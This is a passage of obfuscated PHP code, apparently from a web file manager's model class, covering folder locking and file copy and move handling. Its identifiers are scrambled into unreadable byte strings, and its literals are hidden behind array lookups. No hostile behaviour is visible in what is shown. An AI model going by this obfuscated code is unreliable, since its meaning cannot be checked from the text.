$this->_lockKey($ü¼Ï©¾ [549] . $±Èé¤ˆ¡, $™ıÄº¼»); $this->_lockEvent($±Èé¤ˆ¡, array($ü¼Ï©¾ [543], $ü¼Ï©¾ [544]), $™ıÄº¼»); $this->_lockParent($±Èé¤ˆ¡, array($ü¼Ï©¾ [543], $ü¼Ï©¾ [545]), $™ıÄº¼»); $this->_lockEvent($±Èé¤ˆ¡, array($ü¼Ï©¾ [550], $ü¼Ï©¾ [546], $ü¼Ï©¾ [547]), $™ıÄº¼»); $this->_lockCheckEnd($ü¼Ï©¾ [545], $±Èé¤ˆ¡); } public function lockMoveEnd($ºçµİşÛ) { $‰çÅ·•ù =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->allowLock()) { return; } $ı—üœÈ… = 0; $this->_lockKey($‰çÅ·•ù[549] . $ºçµİşÛ, $ı—üœÈ…); $this->_lockEvent($ºçµİşÛ, array($‰çÅ·•ù[543], $‰çÅ·•ù[544]), $ı—üœÈ…); $this->_lockParent($ºçµİşÛ, array($‰çÅ·•ù[543], $‰çÅ·•ù[545]), $ı—üœÈ…); $this->_lockEvent($ºçµİşÛ, array($‰çÅ·•ù[550], $‰çÅ·•ù[546], $‰çÅ·•ù[547]), $ı—üœÈ…); } private function _lockCheck($²­×Î§ü, $†úÁÉĞ ) { $ ±û±ç =& $_SERVER[¥ÙÌÜ¾ê]; $ä‰äüŸ = $this->sourceInfo($†úÁÉĞ ); $Ø—µÛÖó = $²­×Î§ü . $ ±û±ç[95] . $†úÁÉĞ ; $this->_lockTimeStart[$Ø—µÛÖó] = timeFloat(); if (!is_array($ä‰äüŸ)) { return; } $šéŒ·ää = LNG($ ±û±ç[551]); CacheLock::setErrorMsg($ ±û±ç[160] . htmlspecialchars($ä‰äüŸ[$ ±û±ç[28]]) . $ ±û±ç[530] . $šéŒ·ää); $this->_lockKey($Ø—µÛÖó, 1); $this->_lockKey($Ø—µÛÖó, 0); $Äá¡‹¾ = array_reverse($this->parentLevelArray($ä‰äüŸ[$ ±û±ç[515]])); foreach ($Äá¡‹¾ as $›È­Äâç) { $Ø—µÛÖó = $²­×Î§ü . $ ±û±ç[552] . $›È­Äâç; if (CacheLock::lockGet($ ±û±ç[553] . $Ø—µÛÖó)) { $ä‰äüŸ = $this->sourceInfo($›È­Äâç); CacheLock::setErrorMsg($ ±û±ç[160] . htmlspecialchars($ä‰äüŸ[$ ±û±ç[28]]) . $ ±û±ç[530] . $šéŒ·ää); $this->_lockKey($Ø—µÛÖó, 1); $this->_lockKey($Ø—µÛÖó, 0); } } } private function _lockCheckEnd($¹÷‰ÔÈÑ, $Äò) { $µ„ÛºñÖ =& $_SERVER[¥ÙÌÜ¾ê]; $÷ƒÁ³Íà = $¹÷‰ÔÈÑ . $µ„ÛºñÖ[95] . $Äò; CacheLock::setErrorMsg($µ„ÛºñÖ[376]); if (!isset($this->_lockTimeStart[$÷ƒÁ³Íà])) { return; } $õŠºŸ©Ï = timeFloat() - $this->_lockTimeStart[$÷ƒÁ³Íà]; unset($this->_lockTimeStart[$÷ƒÁ³Íà]); if ($õŠºŸ©Ï > 0.5) { unset(self::$cacheSourceInfo[$µ„ÛºñÖ[452] . $Äò]); } $»Œ’ªŸÑ = $this->sourceInfo($Äò); if (!$»Œ’ªŸÑ) { show_json(LNG($µ„ÛºñÖ[105]), !1); } } private function _lockParent($µÜ†©üü, $ùºİ×‹, $œ‹ÏÛç³) { if (!$this->autoLockSet) { return; } $æš“í¡¥ = $this->sourceInfo($µÜ†©üü); if (!is_array($æš“í¡¥)) { return; } $²¢Îä‘Ö = array_reverse($this->parentLevelArray($æš“í¡¥[$_SERVER[¥ÙÌÜ¾ê][515]])); foreach ($²¢Îä‘Ö as $æŞáˆ©Û) { $this->_lockEvent($æŞáˆ©Û, $ùºİ×‹, $œ‹ÏÛç³); } } private function _lockEvent($ÈÓúèâÍ, $¢³ŞŞ•”, $Š¡¤¯¥) { $šç”ÎÛ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->autoLockSet) { return; } foreach ($¢³ŞŞ•” as $İü¥İÌ) { $Âü¬Ûëü = $İü¥İÌ . $šç”ÎÛ[95] . $ÈÓúèâÍ; if ($Š¡¤¯¥ && CacheLock::lockGet($šç”ÎÛ[553] . $Âü¬Ûëü)) { continue; } $this->_lockKey($Âü¬Ûëü, $Š¡¤¯¥); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ûıùê¹¤, $¹ê™¶ìà = 1) { $ĞÛ­¼’ñ = $_SERVER[¥ÙÌÜ¾ê][553] . md5($Ûıùê¹¤); if ($¹ê™¶ìà) { if (isset(self::$_lockItemArr[$ĞÛ­¼’ñ])) { return; } self::$_lockItemArr[$ĞÛ­¼’ñ] = 1; CacheLock::lock($ĞÛ­¼’ñ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ĞÛ­¼’ñ])) { return; } unset(self::$_lockItemArr[$ĞÛ­¼’ñ]); CacheLock::unlock($ĞÛ­¼’ñ); } } public function isParentOf($Ã“ë¯Ğ¬, $¢³¿Ï–Ê) { $Ç¹Ö¶„œ =& $_SERVER[¥ÙÌÜ¾ê]; $›¼ïæÂ¤ = $this->sourceInfo($Ã“ë¯Ğ¬); $ÑŒâ‘Ó¶ = $this->sourceInfo($¢³¿Ï–Ê); $ÚŠ¤è¤ = $›¼ïæÂ¤[$Ç¹Ö¶„œ[515]] . $›¼ïæÂ¤[$Ç¹Ö¶„œ[397]] . $Ç¹Ö¶„œ[47]; $Ÿä¨Å¹¯ = $ÑŒâ‘Ó¶[$Ç¹Ö¶„œ[515]] . $ÑŒâ‘Ó¶[$Ç¹Ö¶„œ[397]] . $Ç¹Ö¶„œ[47]; $±Ÿí©î÷ = strpos($Ÿä¨Å¹¯, $ÚŠ¤è¤) === 0; return $±Ÿí©î÷; } private $targetIsDelete = 0; public function copy($»¶¼—™, $Æ¥ô´†, $¯‰¡Ù› = REPEAT_REPLACE, $üÏ—üğ¤ = '') { $ŞŠïı =& $_SERVER[¥ÙÌÜ¾ê]; $­èØÈ¿— = $this->sourceInfo($»¶¼—™); $³ÒĞ¶ï = $this->sourceInfo($Æ¥ô´†); if (!$­èØÈ¿— || !$³ÒĞ¶ï || $³ÒĞ¶ï[$ŞŠïı[405]] != $ŞŠïı[87]) { return !1; } if ($this->isParentOf($»¶¼—™, $Æ¥ô´†)) { return !1; } $ÈŸşÖúŠ = $üÏ—üğ¤ ? $üÏ—üğ¤ : $­èØÈ¿—[$ŞŠïı[28]]; $this->lockCopyStart($»¶¼—™); $this->lockWriteStart($Æ¥ô´†, $ÈŸşÖúŠ); $¡ˆ¦¼ÔÎ = array($ŞŠïı[554] => array(), $ŞŠïı[555] => array(), $ŞŠïı[556] => array()); $this->targetIsDelete = intval($­èØÈ¿—[$ŞŠïı[425]]); $ºŞĞñİó = $this->fileNameExistCache($Æ¥ô´†, $­èØÈ¿—[$ŞŠïı[28]]); $„âà§À = $this->_copy($»¶¼—™, $Æ¥ô´†, $¯‰¡Ù›, $¡ˆ¦¼ÔÎ, !0, $üÏ—üğ¤); $this->_childrenListClear(); $this->lockCopyEnd($»¶¼—™); $this->lockWriteEnd($Æ¥ô´†, $ÈŸşÖúŠ); if ($­èØÈ¿—[$ŞŠïı[405]] == $ŞŠïı[87] && $ºŞĞñİó == $„âà§À) { $this->folderSizeResetChildren($ºŞĞñİó); } Model($ŞŠïı[557])->addAll($¡ˆ¦¼ÔÎ[$ŞŠïı[555]], array(), !0); if ($ºŞĞñİó != $„âà§À || $­èØÈ¿—[$ŞŠïı[405]] == $ŞŠïı[87]) { Model($ŞŠïı[558])->eventCopy($„âà§À); } $this->saveAll($¡ˆ¦¼ÔÎ[$ŞŠïı[556]]); Model($ŞŠïı[193])->linkAdd($¡ˆ¦¼ÔÎ[$ŞŠïı[554]]); $this->folderSizeReset($Æ¥ô´†); $this->updateModifyTime($Æ¥ô´†); return $„âà§À; } private function _copy($‚çş–°ú, $Ø°”Š¶°, $·œÛ©, &$‘¸ŠŠ‹¾, $Á´›‰ì±, $ïßÎúÄ = '') { $±é¾¸ó› =& $_SERVER[¥ÙÌÜ¾ê]; $µëØœÄ„ = $this->sourceInfoCache($‚çş–°ú); $ÀŸÊ¹‹ = $µëØœÄ„[$±é¾¸ó›[405]] == $±é¾¸ó›[87]; $Î È¨Œ× = $ïßÎúÄ ? $ïßÎúÄ : $µëØœÄ„[$±é¾¸ó›[28]]; $ÄÅŞş–¿ = $this->fileNameExistCache($Ø°”Š¶°, $Î È¨Œ×); if ($Á´›‰ì±) { $this->_childrenAllMake($‚çş–°ú); if ($ÀŸÊ¹‹ && $ÄÅŞş–¿) { $this->_childrenAllMake($ÄÅŞş–¿); } } if (!$ÄÅŞş–¿) { return $this->_copyCreate($‚çş–°ú, $Ø°”Š¶°, $Î È¨Œ×, $‘¸ŠŠ‹¾); } $¬ˆ÷Ñ´ = $ÄÅŞş–¿; if ($ÀŸÊ¹‹) { if ($·œÛ© == REPEAT_RENAME_FOLDER) { $Î È¨Œ× = $this->fileNameAutoCache($Ø°”Š¶°, $Î È¨Œ×, $·œÛ©, $ÀŸÊ¹‹); $¬ˆ÷Ñ´ = $this->_copyCreate($‚çş–°ú, $Ø°”Š¶°, $Î È¨Œ×, $‘¸ŠŠ‹¾); } else { $¯‘ª€°Ú = $this->_childrenList($‚çş–°ú); foreach ($¯‘ª€°Ú as $±ïÙ¸ùŠ) { $this->_copy($±ïÙ¸ùŠ[$±é¾¸ó›[397]], $ÄÅŞş–¿, $·œÛ©, $‘¸ŠŠ‹¾, !1); } } } else { if ($·œÛ© == REPEAT_RENAME || $·œÛ© == REPEAT_RENAME_FOLDER) { $Î È¨Œ× = $this->fileNameAutoCache($Ø°”Š¶°, $Î È¨Œ×, $·œÛ©, $ÀŸÊ¹‹); $¬ˆ÷Ñ´ = $this->_copyCreate($‚çş–°ú, $Ø°”Š¶°, $Î È¨Œ×, $‘¸ŠŠ‹¾); } else { if ($·œÛ© == REPEAT_REPLACE) { $®Ó€¢§ = $this->sourceInfoCache($ÄÅŞş–¿); $ÂÍ±©ê… = $this->fileHistory($®Ó€¢§, $µëØœÄ„[$±é¾¸ó›[461]], $µëØœÄ„[$±é¾¸ó›[78]]); if ($ÂÍ±©ê…) { $‘¸ŠŠ‹¾[$±é¾¸ó›[554]][] = $µëØœÄ„[$±é¾¸ó›[461]]; } } else { if ($·œÛ© == REPEAT_SKIP) { } } } Hook::trigger($±é¾¸ó›[559], array($±é¾¸ó›[560], $µëØœÄ„, 0)); } return $¬ˆ÷Ñ´; } private function _copyCreate($ªš§­ñ÷, $ï‘Òç¾Ó, $ä¡‚Ï, &$æÀÀ‡–ì) { $¶²„Æ¶å =& $_SERVER[¥ÙÌÜ¾ê]; $ò…İÛ¯Ì = $this->sourceInfoCache($ªš§­ñ÷); $”ÙöÎî… = $this->sourceInfoCache($ï‘Òç¾Ó); $ˆ¾˜òê = $this->_makeItemData($ò…İÛ¯Ì, $”ÙöÎî…, $ä¡‚Ï); Hook::trigger($¶²„Æ¶å[561], $ˆ¾˜òê); Hook::trigger($¶²„Æ¶å[562], array($¶²„Æ¶å[563], $ˆ¾˜òê, 0)); $±¯¨Äí¿ = $this->add($ˆ¾˜òê); $ˆì´ò• = array($¶²„Æ¶å[397] => $±¯¨Äí¿, $¶²„Æ¶å[28] => $ä¡‚Ï); $this->_copyApplyMeta($ˆì´ò•, $æÀÀ‡–ì); if ($ò…İÛ¯Ì[$¶²„Æ¶å[405]] != $¶²„Æ¶å[87]) { $æÀÀ‡–ì[$¶²„Æ¶å[554]][] = $ò…İÛ¯Ì[$¶²„Æ¶å[461]]; return $±¯¨Äí¿; } $ÊÍ˜ÄÔä = array(); $Ó®ö™¤¯ = array(); $this->_childrenListAll($ªš§­ñ÷, $ÊÍ˜ÄÔä); $éÔ–‡ºŞ = count($ÊÍ˜ÄÔä); if ($éÔ–‡ºŞ == 0) { return $±¯¨Äí¿; } $üî·ìŞ = $this->sourceInfo($±¯¨Äí¿); foreach ($ÊÍ˜ÄÔä as $ê–ÙÂìî) { $Ã¢±Ç¿ = $this->_makeItemData($ê–ÙÂìî, $üî·ìŞ, $ê–ÙÂìî[$¶²„Æ¶å[28]]); $Ã¢±Ç¿[$¶²„Æ¶å[515]] = $ê–ÙÂìî[$¶²„Æ¶å[515]]; $Ó®ö™¤¯[] = $Ã¢±Ç¿; } $this->chunkEventSet($¶²„Æ¶å[564], array($¶²„Æ¶å[565], $ˆ¾˜òê, $éÔ–‡ºŞ)); $this->addAll($Ó®ö™¤¯, array(), !1); $ø«óˆ»— = $this->where(array($¶²„Æ¶å[492] => $±¯¨Äí¿))->select(); $”…§† = $this->_childrenMakeRelation($ÊÍ˜ÄÔä, $ø«óˆ»—); $”…§†[$ªš§­ñ÷] = $±¯¨Äí¿; $”ºŠÏÄì = array(); $öìÛÏ± = array(); foreach ($ø«óˆ»— as $ê–ÙÂìî) { $£Å•—ñ = $ê–ÙÂìî[$¶²„Æ¶å[397]]; $ÕÄşÓ– = $this->_childrenMatch($”…§†, $ê–ÙÂìî, $üî·ìŞ); $”ºŠÏÄì[] = array($¶²„Æ¶å[397], $£Å•—ñ, $¶²„Æ¶å[492], $ÕÄşÓ–[$¶²„Æ¶å[492]]); $öìÛÏ±[] = array($¶²„Æ¶å[397], $£Å•—ñ, $¶²„Æ¶å[515], $ÕÄşÓ–[$¶²„Æ¶å[515]]); $this->_copyApplyMeta($ê–ÙÂìî, $æÀÀ‡–ì); if ($ê–ÙÂìî[$¶²„Æ¶å[405]] != $¶²„Æ¶å[87]) { $æÀÀ‡–ì[$¶²„Æ¶å[554]][] = $ê–ÙÂìî[$¶²„Æ¶å[461]]; } } $this->chunkEventSet($¶²„Æ¶å[566], array($¶²„Æ¶å[567], $ˆ¾˜òê, $éÔ–‡ºŞ)); $this->saveAll($”ºŠÏÄì); $this->chunkEventSet($¶²„Æ¶å[568], array($¶²„Æ¶å[569], $ˆ¾˜òê, $éÔ–‡ºŞ)); $this->saveAll($öìÛÏ±); return $±¯¨Äí¿; } private function _childrenMakeRelation($·”Á¿ÇÓ, $Ãƒ¶Áì) { $È«ßâ› =& $_SERVER[¥ÙÌÜ¾ê]; $¬èÉÑ = array(); $…Ëà§ = array(); foreach ($·”Á¿ÇÓ as $”•Õº¿Ä) { $•úéöÊ = $”•Õº¿Ä[$È«ßâ›[28]] . $È«ßâ›[8] . $”•Õº¿Ä[$È«ßâ›[515]]; $¬èÉÑ[$•úéöÊ] = $”•Õº¿Ä[$È«ßâ›[397]]; } foreach ($Ãƒ¶Áì as $”•Õº¿Ä) { $•úéöÊ = $”•Õº¿Ä[$È«ßâ›[28]] . $È«ßâ›[8] . $”•Õº¿Ä[$È«ßâ›[515]]; $ßµÁ÷‹¤ = $¬èÉÑ[$•úéöÊ]; $…Ëà§[$ßµÁ÷‹¤] = $”•Õº¿Ä[$È«ßâ›[397]]; } return $…Ëà§; } private function _childrenMatch($Å¨Øƒ”Ï, $¬æÆûô, $ò¬íÛĞ ) { $°œ–ëÅÁ =& $_SERVER[¥ÙÌÜ¾ê]; $ò™»ıß¢ = $ò¬íÛĞ [$°œ–ëÅÁ[515]]; $óµ—ê› = $this->parentLevelArray($¬æÆûô[$°œ–ëÅÁ[515]]); foreach ($óµ—ê› as $×Úº‚ÑÃ) { if (isset($Å¨Øƒ”Ï[$×Úº‚ÑÃ])) { $ò™»ıß¢ .= $Å¨Øƒ”Ï[$×Úº‚ÑÃ] . $°œ–ëÅÁ[570]; } } $ò™»ıß¢ = rtrim($ò™»ıß¢, $°œ–ëÅÁ[47]) . $°œ–ëÅÁ[47]; $Œ¤ÍØı = $this->parentLevelArray($ò™»ıß¢); $‚Ò·ÒÕÅ = $Œ¤ÍØı[count($Œ¤ÍØı) - 1]; return array($°œ–ëÅÁ[492] => $‚Ò·ÒÕÅ, $°œ–ëÅÁ[515] => $ò™»ıß¢); } private function _makeItemData($à©ğÇéô, $ˆçÔÔµ½, $íÙİÙÔ) { $öúá¥Éı =& $_SERVER[¥ÙÌÜ¾ê]; $Î„„«áÒ = array($öúá¥Éı[571] => $à©ğÇéô[$öúá¥Éı[405]], $öúá¥Éı[415] => $íÙİÙÔ, $öúá¥Éı[572] => $à©ğÇéô[$öúá¥Éı[407]] ? $à©ğÇéô[$öúá¥Éı[407]] : $öúá¥Éı[33], $öúá¥Éı[462] => $à©ğÇéô[$öúá¥Éı[461]] ? $à©ğÇéô[$öúá¥Éı[461]] : 0, $öúá¥Éı[573] => $à©ğÇéô[$öúá¥Éı[78]] ? $à©ğÇéô[$öúá¥Éı[78]] : 0, $öúá¥Éı[574] => intval($ˆçÔÔµ½[$öúá¥Éı[406]]), $öúá¥Éı[575] => intval($ˆçÔÔµ½[$öúá¥Éı[498]]), $öúá¥Éı[576] => intval(USER_ID), $öúá¥Éı[577] => intval(USER_ID), $öúá¥Éı[396] => intval($ˆçÔÔµ½[$öúá¥Éı[397]]), $öúá¥Éı[578] => $ˆçÔÔµ½[$öúá¥Éı[515]] . $ˆçÔÔµ½[$öúá¥Éı[397]] . $öúá¥Éı[47], $öúá¥Éı[419] => $à©ğÇéô[$öúá¥Éı[84]] ? $à©ğÇéô[$öúá¥Éı[84]] : time(), $öúá¥Éı[424] => 0, $öúá¥Éı[579] => $öúá¥Éı[33]); return $Î„„«áÒ; } private function _copyApplyMeta($ö¸ÆÑà, &$“¸ú‰®ƒ) { $²¥°î¤Ø =& $_SERVER[¥ÙÌÜ¾ê]; $¹Ÿ¼¼Ğà = $ö¸ÆÑà[$²¥°î¤Ø[397]]; $´¬¬®ò = $ö¸ÆÑà[$²¥°î¤Ø[28]]; if (!isset($ö¸ÆÑà[$²¥°î¤Ø[580]]) || !$ö¸ÆÑà[$²¥°î¤Ø[580]] || $ö¸ÆÑà[$²¥°î¤Ø[580]] == $²¥°î¤Ø[191]) { $“¸ú‰®ƒ[$²¥°î¤Ø[556]][] = array($²¥°î¤Ø[397], $¹Ÿ¼¼Ğà, $²¥°î¤Ø[580], short_id($¹Ÿ¼¼Ğà)); } if (Input::check($´¬¬®ò, $²¥°î¤Ø[581])) { $“¸ú‰®ƒ[$²¥°î¤Ø[555]][] = array($²¥°î¤Ø[397] => $¹Ÿ¼¼Ğà, $²¥°î¤Ø[93] => $²¥°î¤Ø[458], $²¥°î¤Ø[372] => str_replace($²¥°î¤Ø[50], $²¥°î¤Ø[33], Pinyin::get($´¬¬®ò))); $“¸ú‰®ƒ[$²¥°î¤Ø[555]][] = array($²¥°î¤Ø[397] => $¹Ÿ¼¼Ğà, $²¥°î¤Ø[93] => $²¥°î¤Ø[457], $²¥°î¤Ø[372] => Pinyin::get($´¬¬®ò, $²¥°î¤Ø[582])); } $“¸ú‰®ƒ[$²¥°î¤Ø[555]][] = array($²¥°î¤Ø[397] => $¹Ÿ¼¼Ğà, $²¥°î¤Ø[93] => $²¥°î¤Ø[436], $²¥°î¤Ø[372] => KodSort::makeStr($´¬¬®ò)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($×ñÀ÷Ü) { $¥Ï˜Á =& $_SERVER[¥ÙÌÜ¾ê]; $Â‘¿—× = $this->sourceInfo($×ñÀ÷Ü); $¯¶‚ÅÇ¾ = $¥Ï˜Á[583]; $¨üÊ¯©Ñ = array($¥Ï˜Á[515] => array($¥Ï˜Á[538], $Â‘¿—×[$¥Ï˜Á[515]] . $×ñÀ÷Ü . $¥Ï˜Á[539]), $¥Ï˜Á[425] => $this->targetIsDelete); $­–œèƒÄ = $this->field($¯¶‚ÅÇ¾)->where($¨üÊ¯©Ñ)->select(); if (!$­–œèƒÄ) { return; } $­–œèƒÄ = array_to_keyvalue($­–œèƒÄ, $¥Ï˜Á[397]); foreach ($­–œèƒÄ as $Ç°ïÄüÇ) { $Ü÷Î’Â¾ = $Ç°ïÄüÇ[$¥Ï˜Á[492]]; $×ñÀ÷Ü = $Ç°ïÄüÇ[$¥Ï˜Á[397]]; if (!isset($this->_childrenListCache[$×ñÀ÷Ü]) && $Ç°ïÄüÇ[$¥Ï˜Á[405]] == $¥Ï˜Á[87]) { $this->_childrenListCache[$×ñÀ÷Ü] = array(); } if (!isset($this->_childrenListCache[$Ü÷Î’Â¾])) { $this->_childrenListCache[$Ü÷Î’Â¾] = array(); } $this->_childrenListCache[$Ü÷Î’Â¾][$×ñÀ÷Ü] = $Ç°ïÄüÇ; $this->_childrenItemCache[$×ñÀ÷Ü] = $Ç°ïÄüÇ; } } private function _childrenListAll($Õù®ò´ú, &$ ¬¬­êÜ) { $ñù÷å ‹ =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($this->_childrenListCache[$Õù®ò´ú])) { return; } $¶ÃğÂ× = $this->_childrenListCache[$Õù®ò´ú]; foreach ($¶ÃğÂ× as $ŞÂëšï• => $œˆÔ”ø) { $ ¬¬­êÜ[$ŞÂëšï•] = $œˆÔ”ø; if ($œˆÔ”ø[$ñù÷å ‹[405]] == $ñù÷å ‹[87]) { $this->_childrenListAll($ŞÂëšï•, $ ¬¬­êÜ); } } } private function sourceInfoCache($èôßä”è) { if (isset($this->_childrenItemCache[$èôßä”è])) { return $this->_childrenItemCache[$èôßä”è]; } return $this->sourceInfo($èôßä”è); } private function _childrenList($úÜãöôÌ) { if (isset($this->_childrenListCache[$úÜãöôÌ])) { return $this->_childrenListCache[$úÜãöôÌ]; } return $this->_childrenListSelect($úÜãöôÌ); } private function _childrenListSelect($Èİ´Äçß) { $§ñ—òã… =& $_SERVER[¥ÙÌÜ¾ê]; $Ğ†Œ‘É• = array($§ñ—òã…[492] => $Èİ´Äçß, $§ñ—òã…[425] => $this->targetIsDelete); $„Û¯ºù± = $this->where($Ğ†Œ‘É•)->select(); $„Û¯ºù± = $„Û¯ºù± ? $„Û¯ºù± : array(); $Ù÷Í­‚ = array_to_keyvalue($„Û¯ºù±, $§ñ—òã…[397]); $this->_childrenListCache[$Èİ´Äçß] = $Ù÷Í­‚; foreach ($Ù÷Í­‚ as $Èİ´Äçß => $°ö¶µ‹©) { $this->_childrenItemCache[$Èİ´Äçß] = $°ö¶µ‹©; } return $Ù÷Í­‚; } private function fileNameExistCache($ª³µ¼áÓ, $Òõœ¤²ç) { $ãäÁîÖ =& $_SERVER[¥ÙÌÜ¾ê]; $Òõœ¤²ç = strtolower($Òõœ¤²ç); $Û´¬¶ıñ = $this->_childrenList($ª³µ¼áÓ); foreach ($Û´¬¶ıñ as $·¢É¸Û×) { if ($Òõœ¤²ç == strtolower($·¢É¸Û×[$ãäÁîÖ[28]])) { return $·¢É¸Û×[$ãäÁîÖ[397]]; } } return !1; } private function fileNameAutoCache($éŞµ¹ŸŒ, $¥İ¶ášâ, $ÍùÆÎƒÊ, $ãÁıŞ’) { $ã”†˜¾û =& $_SERVER[¥ÙÌÜ¾ê]; $¡íäëÃ® = $this->_childrenList($éŞµ¹ŸŒ); $¨çì¥ú„ = array_to_keyvalue($¡íäëÃ®, $ã”†˜¾û[33], $ã”†˜¾û[28]); return $this->fileNameAutoGet($¨çì¥ú„, $¥İ¶ášâ, $ÍùÆÎƒÊ, $ãÁıŞ’); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($˜îÏµˆÈ, $Âº…Ñáş, $Ö¥ËÆ—Â = REPEAT_REPLACE, $Ş×ıÎş„ = '') { $°À¾çã =& $_SERVER[¥ÙÌÜ¾ê]; $°»Í‚Ú = $this->sourceInfo($˜îÏµˆÈ); $ç…ÓÖ§€ = $this->sourceInfo($Âº…Ñáş); if ($°»Í‚Ú[$°À¾çã[492]] == $ç…ÓÖ§€[$°À¾çã[397]]) { if ($°»Í‚Ú[$°À¾çã[425]] == $°À¾çã[87]) { Model($°À¾çã[423])->restore(array($˜îÏµˆÈ)); } if (!$Ş×ıÎş„ || $Ş×ıÎş„ == $°»Í‚Ú[$°À¾çã[28]]) { return $˜îÏµˆÈ; } } $óª‡Üß¸ = $this->pathInfoMore($˜îÏµˆÈ); if ($this->isParentOf($˜îÏµˆÈ, $Âº…Ñáş)) { return !1; } if (!$°»Í‚Ú || !$ç…ÓÖ§€ || $ç…ÓÖ§€[$°À¾çã[405]] != $°À¾çã[87]) { return !1; } Hook::trigger($°À¾çã[584], $óª‡Üß¸); $this->targetIsDelete = intval($°»Í‚Ú[$°À¾çã[425]]); if ($°»Í‚Ú[$°À¾çã[492]] == $Âº…Ñáş && $Ş×ıÎş„ != $°»Í‚Ú[$°À¾çã[28]]) { $Â¼êœ = $this->fileNameExist($Âº…Ñáş, $Ş×ıÎş„); if ($Â¼êœ && $°»Í‚Ú[$°À¾çã[405]] == $°À¾çã[191]) { $Æ§¨’§Ğ = $this->sourceInfo($Â¼êœ); $ šÍßš„ = $this->fileHistory($Æ§¨’§Ğ, $°»Í‚Ú[$°À¾çã[461]], $°»Í‚Ú[$°À¾çã[78]]); if (!$ šÍßš„) { Model($°À¾çã[464])->remove($°»Í‚Ú[$°À¾çã[461]]); } $this->removeNow($˜îÏµˆÈ, !1); $this->folderSizeReset($Âº…Ñáş); Hook::trigger($°À¾çã[585], $óª‡Üß¸); return $Â¼êœ; } } $ÈÁÖÙ» = $Ş×ıÎş„ ? $Ş×ıÎş„ : $°»Í‚Ú[$°À¾çã[28]]; $this->lockMoveStart($˜îÏµˆÈ); $this->lockWriteStart($Âº…Ñáş, $ÈÁÖÙ»); $†½¥µªˆ = array($°À¾çã[554] => array(), $°À¾çã[586] => !1); $this->clearShare($˜îÏµˆÈ, $Âº…Ñáş); $Ş”—‡íø = $this->fileNameExistCache($Âº…Ñáş, $°»Í‚Ú[$°À¾çã[28]]); $ŞîÚ“²ê = $this->_move($˜îÏµˆÈ, $Âº…Ñáş, $Ö¥ËÆ—Â, $†½¥µªˆ, $Ş×ıÎş„); $this->sourceCacheClear(); if ($°»Í‚Ú[$°À¾çã[405]] == $°À¾çã[87] && $Ş”—‡íø) { $this->folderSizeResetChildren($ŞîÚ“²ê); } Model($°À¾çã[193])->linkAdd($†½¥µªˆ[$°À¾çã[554]]); if ($Ş”—‡íø && $†½¥µªˆ[$°À¾çã[586]]) { $this->removeNow($˜îÏµˆÈ, !1); } $this->lockMoveEnd($˜îÏµˆÈ); $this->lockWriteEnd($Âº…Ñáş, $ÈÁÖÙ»); $this->folderSizeReset($°»Í‚Ú[$°À¾çã[492]]); $this->folderSizeReset($Âº…Ñáş); $‹ã¨Àë = array($°»Í‚Ú[$°À¾çã[492]], $Âº…Ñáş); if ($°»Í‚Ú[$°À¾çã[405]] == $°À¾çã[87]) { $‹ã¨Àë[] = $˜îÏµˆÈ; } $this->updateModifyTime($‹ã¨Àë); Model($°À¾çã[558])->eventMove($˜îÏµˆÈ, $°»Í‚Ú[$°À¾çã[492]], $Âº…Ñáş); Hook::trigger($°À¾çã[585], $óª‡Üß¸); return $ŞîÚ“²ê; } private function _move($˜ŸÊ¬ÄÔ, $Ü±§ˆ„«, $Éš·¸‘ë, &$¯¥ÔÄûß, $ÍğÒÈÒ½ = '') { $³“Ôáû =& $_SERVER[¥ÙÌÜ¾ê]; $‹¾ˆÆ– = $this->sourceInfo($˜ŸÊ¬ÄÔ); $Ü®òïˆÖ = $‹¾ˆÆ–[$³“Ôáû[405]] == $³“Ôáû[87]; $şúŠ Ò = $ÍğÒÈÒ½ ? $ÍğÒÈÒ½ : $‹¾ˆÆ–[$³“Ôáû[28]]; $™•‰öäñ = $this->fileNameExistCache($Ü±§ˆ„«, $şúŠ Ò); $this->lockMoveStart($˜ŸÊ¬ÄÔ); $this->lockWriteStart($Ü±§ˆ„«, $şúŠ Ò); if (!$™•‰öäñ) { return $this->_moveForce($˜ŸÊ¬ÄÔ, $Ü±§ˆ„«, $şúŠ Ò); } $ØœÏ ¬Ÿ = $™•‰öäñ; $ñ¼˜Á¿ = !1; if ($Ü®òïˆÖ) { if ($Éš·¸‘ë == REPEAT_RENAME_FOLDER) { $şúŠ Ò = $this->fileNameAuto($Ü±§ˆ„«, $şúŠ Ò, $Éš·¸‘ë, $Ü®òïˆÖ); $ØœÏ ¬Ÿ = $this->_moveForce($˜ŸÊ¬ÄÔ, $Ü±§ˆ„«, $şúŠ Ò); } else { if ($Éš·¸‘ë == REPEAT_RENAME_FOLDER) { $Éš·¸‘ë = REPEAT_RENAME; } $Àû»†¶ã = $this->_childrenListSelect($˜ŸÊ¬ÄÔ); foreach ($Àû»†¶ã as $„«‡òÕ¢) { $this->_move($„«‡òÕ¢[$³“Ôáû[397]], $™•‰öäñ, $Éš·¸‘ë, $¯¥ÔÄûß); } $ñ¼˜Á¿ = !0; } } else { if ($Éš·¸‘ë == REPEAT_SKIP) { $ñ¼˜Á¿ = !0; } else { if ($Éš·¸‘ë == REPEAT_RENAME || $Éš·¸‘ë == REPEAT_RENAME_FOLDER) { $şúŠ Ò = $this->fileNameAuto($Ü±§ˆ„«, $şúŠ Ò, $Éš·¸‘ë, $Ü®òïˆÖ); $ØœÏ ¬Ÿ = $this->_moveForce($˜ŸÊ¬ÄÔ, $Ü±§ˆ„«, $şúŠ Ò); } else { if ($Éš·¸‘ë == REPEAT_REPLACE) { $ú¸•İ¢ = $this->sourceInfoCache($™•‰öäñ); $Š©»ğ¼ = $this->fileHistory($ú¸•İ¢, $‹¾ˆÆ–[$³“Ôáû[461]], $‹¾ˆÆ–[$³“Ôáû[78]]); $ñ¼˜Á¿ = !0; if ($Š©»ğ¼) { $¯¥ÔÄûß[$³“Ôáû[554]][] = $‹¾ˆÆ–[$³“Ôáû[461]]; } } } } } if ($ñ¼˜Á¿ && 